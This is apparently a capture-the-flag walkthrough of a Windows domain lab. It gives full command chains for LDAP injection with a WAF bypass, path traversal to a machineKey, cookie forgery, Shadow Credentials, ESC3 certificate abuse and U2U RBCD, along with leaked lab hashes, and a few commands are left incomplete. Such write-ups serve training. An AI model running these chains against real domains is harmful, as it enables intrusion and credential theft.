Section 02

Recon & Web Exploitation

01
LDAP Injection — WAF Bypass via Double URL Encoding
SSO Login · %252A bypass · blind description extraction

The SSO login at /Login passes the username field directly into an LDAP query without sanitisation. A WAF blocks standard LDAP metacharacters, but double URL encoding bypasses it: * → %252A, ( → %2528, ) → %2529. Blind character-by-character extraction against the description attribute reveals a plaintext password stored in johnathan.j's account description.

bash — blind LDAP injection oracle
# WAF blocks: * ( )  → use double URL encoding
# * = %252A   ( = %2528   ) = %2529
# Response size 3310 = multiple results = character matched

# Blind extraction of description attribute for johnathan.j
# Inject: johnathan.j)(description=c* → MATCH
# Iterate character by character until full value extracted

johnathan.j description: change*th1s_p@ssw()rd!!
bash — password spray via kinit
# NTLM is disabled — must spray via Kerberos kinit
printf 'change*th1s_p@ssw()rd!!\n' | kinit ken.w@HERCULES.HTB

Password for ken.w@HERCULES.HTB:
[+] ken.w authenticates successfully
✓

Section 03

Web Exploitation — machineKey & Cookie Forgery

02
Path Traversal → machineKey Extraction
/Home/Download · backslash traversal · web.config

The /Home/Download endpoint accepts a fileName POST parameter and returns files from the server. Forward slashes are blocked but backslashes work as path separators on Windows, enabling traversal to web.config. The file extension filter allows .config, making this traversal trivially exploitable. The web.config contains the ASP.NET machineKey used to sign and encrypt .ASPXAUTH cookies.

bash — path traversal to web.config
curl -sk -b cookies.txt --data-urlencode 'fileName=..\..\web.config' \
  https://hercules.htb/Home/Download -o web.config

# Extracted machineKey from web.config:
<machineKey decryption="AES"
  decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
  validation="HMACSHA256"
  validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214..." />
✕
Critical: With the machineKey, any .ASPXAUTH cookie can be forged for any username with any role. The encryption key (AES) and signing key (HMAC-SHA256) allow full ticket construction without knowing any user's password.
03
Forge "web administrators" Cookie → Malicious DOCX Upload
FormsAuth ticket structure · role injection · NTLM hash capture

Reversing the .ASPXAUTH cookie structure reveals the role field maps to the LDAP department attribute. The role "web administrators" (compared to regular "Web Users") enables a file upload form on the Report Submission page. A forged cookie with this role is crafted using the machineKey. Uploading a malicious DOCX (with embedded UNC path via ntlm_theft) triggers the server-side document processor to make an outbound SMB connection to Responder.

python — cookie ticket structure
# .ASPXAUTH AES-encrypted + HMAC-SHA256-signed ticket structure:
[16 random bytes]
[01 01]                         — ticket version
[8-byte timestamp]              — issued time
[8-byte expiry]                 — expiry time
[08 00]                         — separator
[len][username UTF-16LE]        — <-- inject: web_admin
[len][role UTF-16LE]            — <-- inject: web administrators
[len][path UTF-16LE]            — typically "/"
[ff]                            — terminal marker
[HMAC-SHA256(validationKey, ticket_data)]
[PKCS7 padding]

# Forge cookie for any user + any role using extracted machineKey

AD Exploitation — Shadow Creds & Object Move

04
natalie.a → bob.w via Shadow Credentials
bloodyAD · msDS-KeyCredentialLink · PKINIT

natalie.a is in the Web Support group, which holds implicit write permissions on all users in the Web Department OU. Shadow Credentials abuse (msDS-KeyCredentialLink) allows adding a certificate-based credential to any writable user object, enabling PKINIT authentication — which returns the user's NT hash via AS-REP unpac.

bash
export KRB5CCNAME=/home/kali/natalie.a.ccache
getTGT.py hercules.htb/natalie.a -password 'Prettyprincess123!' -dc-ip 10.129.242.196

bloodyAD -d hercules.htb -u natalie.a -k ccache=natalie.a.ccache \
  --host dc.hercules.htb add shadowCredentials bob.w

[+] Key credential added to bob.w
[+] NT hash via PKINIT: 8a65c74e8f0073babbfac6725c66cc3f
✓
bob.w NT hash: 8a65c74e8f0073babbfac6725c66cc3f — bob.w is in Recruitment Managers, which holds CreateChild/DeleteChild (0x3) on multiple OUs.
05
bob.w → auditor via LDAP ModifyDN (Object Move)
CreateChild/DeleteChild · ModifyDN · OU relocation

bob.w (Recruitment Managers) has CreateChild + DeleteChild permissions on Security Department and Web Department OUs. The LDAP ModifyDN operation relocates an object between OUs — requiring DeleteChild on the source OU and CreateChild on the destination. Moving auditor from Security Department into Web Department brings it under natalie.a's write permissions, enabling Shadow Credentials against auditor.

bash — move auditor between OUs
export KRB5CCNAME=/home/kali/bob.w.ccache
getTGT.py hercules.htb/bob.w -hashes ':8a65c74e8f0073babbfac6725c66cc3f' -dc-ip 10.129.242.196

# LDAP ModifyDN: move auditor from Security Dept → Web Dept
bloodyAD -d hercules.htb -u bob.w -k ccache=bob.w.ccache \
  --host dc.hercules.htb set object auditor distinguishedName \
  -v 'CN=Auditor,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'

[+] auditor moved to Web Department OU
# auditor is now under natalie.a's write permissions
◈
Key Technique — AD Object Move: LDAP ModifyDN doesn't just rename objects — it relocates them between OUs. This changes which inherited ACEs apply, effectively changing which accounts have write access. Moving a target user into an OU where you already have write permissions bypasses ACL restrictions on the original OU.
06
natalie.a → auditor via Shadow Credentials + User Flag
Shadow Creds · Remote Management Users · WinRM SSL

With auditor relocated to Web Department, natalie.a's write permissions now apply. Shadow Credentials are added to auditor, yielding its NT hash via PKINIT. auditor is in Remote Management Users — WinRM over SSL on port 5986 provides the shell. Since NTLM is disabled, the NT hash must be exchanged for a Kerberos TGT first.

bash
bloodyAD -d hercules.htb -u natalie.a -k ccache=natalie.a.ccache \
  --host dc.hercules.htb add shadowCredentials auditor

[+] NT hash via PKINIT: a9285c625af80519ad784729655ff325

# Get TGT from NT hash (no NTLM — hash must become TGT)

export KRB5CCNAME=auditor.ccache

Section 05

Root — ESC3 · SDProp Bypass · U2U RBCD

07
GenericAll on Forest Migration OU + SDProp Bypass
auditor ACL · adminCount=1 · SYSTEM Password Cleanup task

auditor can grant GenericAll on the Forest Migration OU. IIS_Administrator is in Service Operators (a protected group), so SDProp automatically sets adminCount=1 and strips inherited ACEs every 60 minutes. The bypass: the Password Cleanup scheduled task runs as SYSTEM and clears adminCount + re-enables inheritance on objects in OUs where IT Support has ExtendedRight|GenericAll. Adding IT Support to Forest Migration OU triggers this task to clean adminCount off IIS_Administrator.

bash — set GenericAll on Forest Migration OU
bloodyAD -d hercules.htb -u auditor -k ccache=auditor.ccache \
  --host dc.hercules.htb add genericAll \
  'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor

bloodyAD -d hercules.htb -u auditor -k ccache=auditor.ccache \
  --host dc.hercules.htb add genericAll \
  'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT Support'

[+] GenericAll added for auditor on Forest Migration OU
[+] GenericAll added for IT Support on Forest Migration OU
# SYSTEM Password Cleanup task now sees IT Support GenericAll
# and will clear adminCount + re-enable inheritance on IIS_Administrator
⚠
SDProp/adminCount Race: The Password Cleanup SYSTEM task fires periodically. After adding IT Support GenericAll, wait for the task to run (or trigger it via ashley.b's WinRM). The window to enable IIS_Administrator before SDProp re-strips the ACEs is narrow — act immediately after the task completes.
08
ESC3 — Enrollment Agent → ashley.b Certificate
certipy-ad · Enrollment Agent cert · on-behalf-of · PKINIT

ESC3 abuses the Enrollment Agent certificate template. First, fernando.r (Smartcard Operators) is enabled and given a known password. fernando.r requests an Enrollment Agent certificate, then uses it to request a User certificate on behalf of ashley.b. The resulting certificate is authenticated via PKINIT to get ashley.b's NT hash and WinRM access — enabling the SYSTEM task trigger.

bash — ESC3 chain
# Enable fernando.r and set password (via auditor's GenericAll)
bloodyAD ... remove uac fernando.r -f ACCOUNTDISABLE
bloodyAD ... set password fernando.r 'F3rn@nd0#2026!!'

# Step 1: Request Enrollment Agent certificate
certipy-ad req -u fernando.r@hercules.htb -k -no-pass -ca CA-HERCULES \
  -template EnrollmentAgent -out ea_cert -dcom

# Step 2: Request User cert on-behalf-of ashley.b
certipy-ad req -u fernando.r@hercules.htb -k -no-pass -ca CA-HERCULES \
  -template User -on-behalf-of 'HERCULES\ashley.b' \
  -pfx ea_cert.pfx -out ashley_cert -dcom

# Step 3: PKINIT auth → get ashley.b NT hash
certipy-ad auth -pfx ashley_cert.pfx -dc-ip 10.129.242.196 -domain hercules.htb
[+] ashley.b NT hash: <ashley_nt_hash>

# WinRM as ashley.b → trigger SYSTEM Password Cleanup task
evil-winrm -i dc.hercules.htb -r hercules.htb -S

Start-Sleep 15

09
Session Key Hash Sync + U2U + RBCD → DCSync
iis_webserver$ · TGT session key · changepasswd · force-forwardable · S4U2Proxy

DC$ has RBCD configured trusting iis_webserver$. However, iis_webserver$ is a user account with no SPNs — standard S4U2Self fails because the KDC rejects S4U2Self for accounts without SPNs unless the ticket is non-forwardable, and S4U2Proxy requires a forwardable S4U2Self ticket. The solution: session key hash sync. The NT hash is set equal to the TGT session key, enabling force-forwardable to succeed when combined with U2U (User-to-User) authentication.

powershell — IIS_Administrator resets iis_webserver$ password
# Reset iis_webserver$ to a known password via Service Operators rights
$cred = New-Object PSCredential("HERCULES\IIS_Administrator",
  (ConvertTo-SecureString "SvcP@ss2026!!" -AsPlainText -Force))
Set-ADAccountPassword -Identity "iis_webserver$" \
  -NewPassword (ConvertTo-SecureString "<64-char-random>" -AsPlainText -Force) \
  -Reset -Credential $cred
bash — session key hash sync technique
# Step 1: Get TGT for iis_webserver$
getTGT.py 'hercules.htb/iis_webserver$' -hashes ':' -dc-ip 10.129.242.196

# Step 2: Extract session key from ccache
python3 << 'EOF'
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('iis_webserver$.ccache')
session_key = cc.credentials[0]['key']['keyvalue'].hex()
print(f"Session key: {session_key}")
EOF

# Step 3: Sync NT hash = TGT session key (CRITICAL trick)
changepasswd.py -newhashes ":" \
  "hercules.htb/iis_webserver$@dc.hercules.htb" \
  -hashes ":" -dc-ip 10.129.242.196

# Step 4: S4U2Self (U2U) + force-forwardable + S4U2Proxy
getST.py -spn 'cifs/dc.hercules.htb' -impersonate 'Administrator' \
  -hashes ":" -dc-ip 10.129.242.196 \
  -u2u -force-forwardable 'hercules.htb/iis_webserver$'

[*] Requesting S4U2self (U2U)
[*] force-forwardable applied
[*] Requesting S4U2Proxy
[*] Saving: Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
◈
Why Session Key Hash Sync Works: Kerberos encrypts the S4U2Self ticket with the account's long-term key (derived from NT hash). For force-forwardable to succeed in U2U mode, the KDC encrypts the service ticket with the TGT session key. By making the NT hash equal to the session key, both encryption paths converge — the KDC accepts the U2U request and the resulting ticket becomes forwardable, satisfying S4U2Proxy's requirement.

key takeaways
01 // WAF BYPASS
Double URL Encoding for LDAP Injection
WAFs that block LDAP metacharacters often fail to decode double-encoded input (%252A for *). The application decodes once before passing to the WAF's input, and the WAF passes it through — then the backend LDAP library decodes a second time. WAFs must normalise input before inspection.
02 // ASPNET SECURITY
machineKey = Full Cookie Forgery
The ASP.NET machineKey is the root secret for all FormsAuthentication cookies. Any file read vulnerability (path traversal, LFI, SSRF) that reaches web.config yields complete authentication bypass for all users and roles. The machineKey must be protected at the filesystem level and rotated periodically.
03 // AD OBJECT MOVE
LDAP ModifyDN Changes ACL Scope
Moving an AD object between OUs changes which inherited ACEs apply to it. If an attacker has CreateChild/DeleteChild on two OUs, they can relocate target users under OUs where they already have write permissions — bypassing ACL restrictions on the original OU. Regular auditing of OU-level ACEs (not just object-level) is essential.
04 // SDPROP BYPASS
adminCount Cleared via SYSTEM Scheduled Task
SDProp protects privileged group members by stripping inherited ACEs — but a SYSTEM scheduled task that selectively clears adminCount creates a bypass window. Any SYSTEM-level automation that modifies security descriptors based on group membership is a potential SDProp bypass vector and should be audited carefully.
05 // ESC3 ADCS
Enrollment Agent Template Impersonation
ESC3 allows any principal with enroll rights on an Enrollment Agent template to request certificates on behalf of any other user. This bypasses password requirements entirely — if a low-privilege account can enroll an EA cert, it can impersonate any domain user including Administrators. Restrict Enrollment Agent templates to dedicated, audited accounts.
06 // U2U KERBEROS
Session Key Hash Sync Enables RBCD for Accounts Without SPNs
Standard RBCD S4U2Proxy requires a forwardable S4U2Self ticket — which the KDC denies for accounts without SPNs unless U2U is used. By synchronising the account's NT hash to equal its TGT session key, force-forwardable succeeds in U2U mode, enabling full RBCD exploitation against user accounts. This is an advanced Kerberos technique requiring impacket's -u2u -force-forwardable flags.
